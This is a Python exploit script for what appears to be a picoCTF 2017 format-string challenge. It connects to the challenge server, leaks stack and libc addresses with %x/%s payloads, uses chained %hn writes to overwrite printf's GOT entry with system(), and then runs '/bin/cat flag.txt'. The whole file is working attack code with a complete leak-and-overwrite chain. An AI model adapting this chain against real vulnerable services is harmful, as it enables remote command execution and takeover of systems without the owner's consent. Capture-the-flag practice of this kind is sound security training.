import struct, time, telnetlib
from socket import *

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[];
    data='';
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    the_socket.setblocking(1)
    return ''.join(total_data)

def indicator(exploit):
  return "ABCD"+exploit+"EFGH"

def value(reply):
  start = reply.index("ABCD")+4
  end = reply.index("EFGH")
  return reply[start:end]

s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 44887))

#PAYLOAD 1: Calculate stack base address
exploit = indicator("%9$x")
s.send(exploit+'\n')
data = value(s.recv(2048))
base_addr = int(data, 16) - 4*15
print "base_addr: 0x"+hex(base_addr)

#PAYLOAD 2: Write 'flagSize' address to a location
flagSize_addr = hex(base_addr + 4*6)
portion = int(flagSize_addr[-4:], 16)
exploit = "%"+str(portion-0x81)+"x%17$hn"
s.send(exploit+'\n')
recv_timeout(s)
#print exploit

#PAYLOD 3: Replace 'flagSize' with 0xffff
exploit = "%"+str(0x6c0-0x81)+"x%53$hn"
s.send(exploit+'\n')
recv_timeout(s)
#print exploit

def pad(buf):
    buf += "\x41"*(0x358-len(buf))
    buf += "\x90"*(0x360-len(buf))
    return buf

#Setup pointer to write to
def setup(address):
    stack_pos = base_addr + 4*18

    stack_msb = "{0:0{1}x}".format(stack_pos+2,8)
    stack_lsb = "{0:0{1}x}".format(stack_pos,8)
    addr_msb = "{0:0{1}x}".format(address+2,8)
    addr_lsb = "{0:0{1}x}".format(address,8)

    portion = int(stack_msb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%17$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit
    portion = int(addr_msb[-8:-4], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%53$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit
    portion = int(stack_lsb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%17$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit
    portion = int(addr_msb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%53$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit

    stack_msb = "{0:0{1}x}".format(stack_pos+0x4+2,8)
    stack_lsb = "{0:0{1}x}".format(stack_pos+0x4,8)
    portion = int(stack_msb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%18$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit
    portion = int(addr_lsb[-8:-4], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%55$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit
    portion = int(stack_lsb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%18$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit
    portion = int(addr_lsb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%55$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit

#Write to the pointer prepared
def write(address):
    address = "{0:0{1}x}".format(address,8)

    exploit = "/bin/sh #"
    exploit = pad(exploit)
    msb = int(address[-8:-4], 16)
    exploit += "%"+str(msb)+"x%19$hn" #Carry->0x0804
    lsb = int(address[-4:], 16)
    if msb > lsb:
        lsb += 0x10000
    exploit += "%"+str(lsb-msb)+"x%20$hn"
    s.send(exploit+'\n')
    recv_timeout(s)
    #print exploit

#system_libc = 0xf7e33b30
#printf setup
#setup(0x8049984)
#printf overwrite
#write(system_libc)

#printf setup
setup(0x8049970)

#PAYLOAD 2: Get the 'printf' libc address
exploit = indicator("%20$s")
s.send(exploit+'\n')
data = value(s.recv(2048))
data = data[0:4]
printf_libc =''
for c in data:
  printf_libc = hex(ord(c))[2:] + printf_libc
print "printf_libc: 0x"+printf_libc

#Calculate base libc address
base_libc = int(printf_libc, 16) - 0x4cc70
print "base_libc: "+hex(base_libc)

#Calculate 'system' libc address
system_libc = base_libc + 0x3e3e0
print "system_libc: "+hex(system_libc)

#system_libc = 0xf7e33b30

#printf overwrite
write(system_libc)

#Break 0x80486a9
#Break 0x80486b7
#PLT 0x8049970

exploit = "\x90"*0x360 #Fill up input
exploit += "/bin/cat flag.txt"
s.send(exploit+'\n')
print recv_timeout(s)
